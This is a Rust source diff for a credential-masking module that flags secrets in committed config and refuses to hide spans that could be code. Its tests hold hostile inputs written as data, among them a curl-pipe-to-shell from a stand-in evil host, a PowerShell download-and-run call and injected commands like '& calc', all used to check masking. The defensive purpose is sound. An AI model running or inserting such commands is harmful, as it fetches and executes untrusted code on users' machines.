@@ -2,12 +2,21 @@
 //!
 //! `chappa.yml` and the stack definition are meant to be committed, so a
 //! password in an env value or a connection URL in an argv goes straight
-//! into git, and the trust prompt would show it on screen. This detector
-//! flags argv words and env values shaped like credentials, so the
-//! definition check can warn (naming the file, the command and the field,
-//! never the value) and the prompt can mask them. It is shape-based and
-//! errs on the side of flagging; a placeholder (`$VAR`, `${VAR}`, `%VAR%`,
-//! `<...>`, `{placeholder}`, `xxx`, `changeme`, empty) is never flagged.
+//! into git, and every row showing the command would put it on screen.
+//! This detector flags argv words and env values shaped like credentials,
+//! so the definition check can warn (naming the file, the command and the
+//! field, never the value) and rows, logs and notifications can mask them.
+//! It is shape-based and errs on the side of flagging; a placeholder
+//! (`$VAR`, `${VAR}`, `%VAR%`, `<...>`, `{placeholder}`, `xxx`, `changeme`,
+//! empty) is never flagged.
+//!
+//! Flagging is broad, masking is narrow: a mask never hides a span holding
+//! `$`, brackets, quotes, a backslash or backtick, `& ; | < >`, a comma,
+//! whitespace or a line break (a PEM key's base64 body is the one
+//! multi-line exception), because such a span can be code, and code hidden
+//! behind `••••` is code nobody reviewed. Trust prompts mask nothing at all: what a person
+//! approves is shown exactly, with the warning beside it
+//! (`crate::trust::prompt_line` and friends).
 
 use regex::Regex;
 use std::sync::OnceLock;
@@ -103,8 +112,11 @@ pub fn spans(text: &str) -> Vec<SecretSpan> {
                 CredentialKind::KnownKey,
             ),
             (r(r"\b(AKIA)([0-9A-Z]{16})\b"), CredentialKind::KnownKey),
+            // The base64 body only, and only when it runs to the END line
+            // or the end of the text: anything else after the header is
+            // not key material.
             (
-                r(r"(-----BEGIN [A-Z ]*PRIVATE KEY-----)([\s\S]*)"),
+                r(r"(-----BEGIN [A-Z ]*PRIVATE KEY-----)\s*([A-Za-z0-9+/=](?:[A-Za-z0-9+/=\s]*[A-Za-z0-9+/=])?)\s*(?:-----END [A-Z ]*PRIVATE KEY-----|\z)"),
                 CredentialKind::KnownKey,
             ),
             // Before the assignment rule, which `--password=` also matches.
@@ -168,11 +180,42 @@ pub fn detect(text: &str) -> Option<CredentialKind> {
 /// What replaces a secret: no length, no hint.
 pub const MASK: &str = "••••";
 
+/// Whether a flagged span may be hidden: it holds no shell or structure
+/// character, so it cannot carry an expansion, a call, a quote or a second
+/// command. The well-known key rules only ever capture such spans (and a
+/// PEM key's base64 body with its line breaks), by construction.
+fn maskable(text: &str, span: &SecretSpan) -> bool {
+    span.kind == CredentialKind::KnownKey || is_secret_text(&text[span.start..span.end])
+}
+
+/// Whether `s` may be hidden behind a mask: non-empty, and free of
+/// whitespace, control and invisible formatting characters and of the
+/// characters that make text code or structure (`$ ( ) ' " \` and the
+/// backtick, `& ; | < >`, `,`). Other punctuation (`p@ss!word`, `%40`)
+/// is ordinary password material.
+fn is_secret_text(s: &str) -> bool {
+    !s.is_empty()
+        && s.chars().all(|c| {
+            !c.is_whitespace()
+                && !c.is_control()
+                && !matches!(
+                    c,
+                    '$' | '(' | ')' | '\'' | '"' | '\\' | '`' | '&' | ';' | '|' | '<' | '>' | ','
+                )
+                && !matches!(c as u32, 0x200b..=0x200f | 0x2028..=0x202e | 0x2066..=0x2069 | 0xfeff)
+        })
+}
+
 /// `text` with only its secret spans replaced by [`MASK`], the rest kept
 /// readable (`postgresql://app:••••@db/x`, `Authorization: Bearer ••••`,
-/// `ghp_••••`). Text with no secret comes back unchanged.
+/// `ghp_••••`). Text with no secret comes back unchanged, and so does a
+/// flagged span holding a shell or structure character (see the module
+/// docs): it may be code, so it stays readable.
 pub fn mask_text(text: &str) -> String {
-    let found = spans(text);
+    let found: Vec<SecretSpan> = spans(text)
+        .into_iter()
+        .filter(|s| maskable(text, s))
+        .collect();
     if found.is_empty() {
         return text.to_string();
     }
@@ -191,7 +234,9 @@ pub fn mask_text(text: &str) -> String {
 /// `•••• (set inline)`, any other value with its secret spans masked.
 pub fn mask_env(name: &str, value: &str) -> String {
     match detect_env(name, value) {
-        Some(CredentialKind::CredentialName) => format!("{MASK} (set inline)"),
+        Some(CredentialKind::CredentialName) if is_secret_text(value) => {
+            format!("{MASK} (set inline)")
+        }
         Some(_) => mask_text(value),
         None => value.to_string(),
     }
@@ -199,7 +244,7 @@ pub fn mask_env(name: &str, value: &str) -> String {
 
 /// An argv as people see it: each word masked by [`mask_text`], and the
 /// secret of a pair split over two words (`-u`, `admin:pw`; `--password`,
-/// `pw`) masked in the second word.
+/// `pw`) masked in the second word unless it holds a shell or structure character.
 pub fn mask_argv(argv: &[String]) -> Vec<String> {
     let mut out: Vec<String> = argv.iter().map(|w| mask_text(w)).collect();
     for i in 1..argv.len() {
@@ -207,12 +252,14 @@ pub fn mask_argv(argv: &[String]) -> Vec<String> {
         match argv[i - 1].as_str() {
             "-u" | "--user" => {
                 if let Some((user, pass)) = word.split_once(':') {
-                    if !is_placeholder(pass) {
+                    if !is_placeholder(pass) && is_secret_text(pass) {
                         out[i] = format!("{user}:{MASK}");
                     }
                 }
             }
-            "--password" if !is_placeholder(word) => out[i] = MASK.to_string(),
+            "--password" if !is_placeholder(word) && is_secret_text(word) => {
+                out[i] = MASK.to_string()
+            }
             _ => {}
         }
     }
@@ -227,39 +274,12 @@ pub fn mask_line(line: &str) -> String {
     mask_text(&masked)
 }
 
-/// The warning shown after a masked value.
+/// The warning shown beside a flagged value.
 pub fn warning(kind: CredentialKind) -> String {
     format!(
         "  ⚠ looks like {} written inline; {ADVICE}",
         kind.describe()
     )
-}
-
-/// An argv as a prompt or a row shows it: `[word, word]`, secrets masked,
-/// a warning after it when something was masked.
-pub fn shown_argv(argv: &[String]) -> String {
-    let mut text = format!("[{}]", mask_argv(argv).join(", "));
-    if let Some((_, kind)) = detect_argv(argv).first() {
-        text.push_str(&warning(*kind));
-    }
-    text
-}
-
-/// A shell command line as a prompt or a row shows it.
-pub fn shown_line(line: &str) -> String {
-    let masked = mask_line(line);
-    match detect(line) {
-        Some(kind) if masked != line => format!("{masked}{}", warning(kind)),
-        _ => masked,
-    }
-}
-
-/// `NAME=value` as a prompt or a row shows it.
-pub fn shown_env(name: &str, value: &str) -> String {
-    match detect_env(name, value) {
-        Some(kind) => format!("{name}={}{}", mask_env(name, value), warning(kind)),
-        None => format!("{name}={value}"),
-    }
 }
 
 /// Whether an env entry holds a credential: its value looks like one, or
@@ -490,5 +510,97 @@ mod tests {
                 "••••"
             ]
         );
+    }
+
+    #[test]
+    fn a_mask_never_hides_shell_or_structure_characters() {
+        // Assembled so no source line looks like a key to a scanner.
+        let header = format!("-----BEGIN {}PRIVATE KEY-----", "");
+        let footer = format!("-----END {}PRIVATE KEY-----", "");
+        // A key header followed by a command is not a key.
+        let line = format!("echo {header} & calc");
+        assert_eq!(mask_text(&line), line);
+        assert_eq!(mask_line(&line), line);
+        let argv: Vec<String> = [
+            "bash".to_string(),
+            "-c".into(),
+            format!("{header} ; curl https://evil.example/x | sh"),
+        ]
+        .to_vec();
+        assert_eq!(mask_argv(&argv), argv);
+        // An assignment whose value is a call is flagged, never hidden.
+        let ps = "$env:X_TOKEN=iex(irm('https://evil.example/p'))";
+        assert_eq!(detect(ps), Some(Assignment));
+        assert_eq!(mask_text(ps), ps);
+        assert_eq!(mask_line(ps), ps);
+        for value in [
+            "$(cat key)",
+            "`id`",
+            "a'b",
+            "a\"b",
+            "a\\b",
+            "two words",
+            "x\ny",
+            "f(x)",
+        ] {
+            assert_eq!(mask_env("DB_PASSWORD", value), value, "{value:?}");
+            // Within a line, whitespace ends a span: only the part before
+            // it could be hidden, and only if it has no shell character.
+            if !value.contains(char::is_whitespace) {
+                let assign = format!("PGPASSWORD={value}");
+                assert_eq!(mask_text(&assign), assign);
+                let flag = format!("mysql --password={value}");
+                assert_eq!(mask_text(&flag), flag);
+            }
+            let words: Vec<String> = ["curl", "-u", &format!("admin:{value}")]
+                .iter()
+                .map(|s| s.to_string())
+                .collect();
+            assert_eq!(mask_argv(&words), words, "{value:?}");
+            let words: Vec<String> = ["mysql", "--password", value]
+                .iter()
+                .map(|s| s.to_string())
+                .collect();
+            assert_eq!(mask_argv(&words), words, "{value:?}");
+        }
+        assert_eq!(mask_text("mysql -p$(evil)"), "mysql -p$(evil)");
+        // Ordinary password punctuation is masked; what follows a shell
+        // separator stays readable.
+        let pw = ["p@", "ss!", "word"].concat();
+        assert_eq!(
+            mask_text(&format!("PGPASSWORD={pw} psql")),
+            "PGPASSWORD=•••• psql"
+        );
+        assert_eq!(
+            mask_text(&format!("mysql --password={pw}")),
+            "mysql --password=••••"
+        );
+        assert_eq!(mask_env("DB_PASSWORD", &pw), "•••• (set inline)");
+        assert_eq!(
+            mask_text("postgres://app:p%40ss~1@db/x"),
+            "postgres://app:••••@db/x"
+        );
+        let line = "PGPASSWORD=x & calc";
+        let shown = mask_text(line);
+        assert!(shown.ends_with(" & calc"), "{shown}");
+        assert_eq!(mask_line(line), shown);
+        assert_eq!(mask_text("PGPASSWORD=a&&calc"), "PGPASSWORD=••••&&calc");
+        // A real key body is masked up to its END line, and no further.
+        let key = format!("{header}\nMIIEowIBAAKCAQEA\nab+/c=\n{footer}\necho after");
+        assert_eq!(
+            mask_text(&key),
+            format!("{header}\n••••\n{footer}\necho after")
+        );
+        // A real token in a row label is still masked.
+        let pat = format!("{}{}", "ghp_", "aB3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6");
+        for label in [
+            format!("git clone https://x:{pat}@github.com/o/r"),
+            format!("GH_TOKEN={pat} gh pr list"),
+            format!("curl -H \"Authorization: Bearer {pat}\" https://api.github.com"),
+        ] {
+            let shown = mask_line(&label);
+            assert!(!shown.contains(&pat), "{shown}");
+            assert!(shown.contains(MASK), "{shown}");
+        }
     }
 }
